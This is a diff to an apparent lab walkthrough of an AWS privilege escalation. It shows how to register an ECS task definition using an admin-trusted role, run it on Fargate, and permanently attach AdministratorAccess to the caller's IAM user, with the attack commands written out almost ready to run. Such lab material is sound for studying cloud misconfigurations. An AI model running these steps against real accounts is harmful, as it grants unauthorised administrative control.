@@ -22,6 +22,12 @@ First, confirm who you are and verify your permissions are in place:
 aws sts get-caller-identity
 ```
 
+Save your account ID — you will need it to build the role ARNs later:
+
+```bash
+ACCOUNT_ID=$(aws sts get-caller-identity --query 'Account' --output text)
+```
+
 Check what the admin target role looks like — specifically its trust policy — to confirm it trusts ECS tasks:
 
 ```bash
@@ -47,8 +53,8 @@ Register a task definition that uses the admin role as both the task role and th
 ```bash
 aws ecs register-task-definition \
   --family pl-prod-ecs-004-privesc \
-  --task-role-arn arn:aws:iam::{account_id}:role/pl-prod-ecs-004-to-admin-target-role \
-  --execution-role-arn arn:aws:iam::{account_id}:role/pl-prod-ecs-004-to-admin-target-role \
+  --task-role-arn arn:aws:iam::${ACCOUNT_ID}:role/pl-prod-ecs-004-to-admin-target-role \
+  --execution-role-arn arn:aws:iam::${ACCOUNT_ID}:role/pl-prod-ecs-004-to-admin-target-role \
   --network-mode awsvpc \
   --requires-compatibilities FARGATE \
   --cpu 256 --memory 512 \
@@ -60,11 +66,12 @@ The `--task-role-arn` is what matters for the privilege escalation: the running 
 ### Step 2: Launch the task on Fargate
 
 ```bash
-aws ecs run-task \
+TASK_ARN=$(aws ecs run-task \
   --cluster pl-prod-ecs-004-cluster \
   --task-definition pl-prod-ecs-004-privesc \
   --launch-type FARGATE \
-  --network-configuration "awsvpcConfiguration={subnets=[<subnet-id>],assignPublicIp=ENABLED}"
+  --network-configuration "awsvpcConfiguration={subnets=[$SUBNET_ID],assignPublicIp=ENABLED}" \
+  --query 'tasks[0].taskArn' --output text)
 ```
 
 The task will provision, start, execute the AWS CLI command, and stop — all within a few seconds. The `AdministratorAccess` policy attachment is permanent on your IAM user even after the task exits.
@@ -74,7 +81,7 @@ The task will provision, start, execute the AWS CLI command, and stop — all wi
 ```bash
 aws ecs describe-tasks \
   --cluster pl-prod-ecs-004-cluster \
-  --tasks <task-arn>
+  --tasks "$TASK_ARN"
 ```
 
 Wait for the task to reach `STOPPED` status with an exit code of `0` on the container.
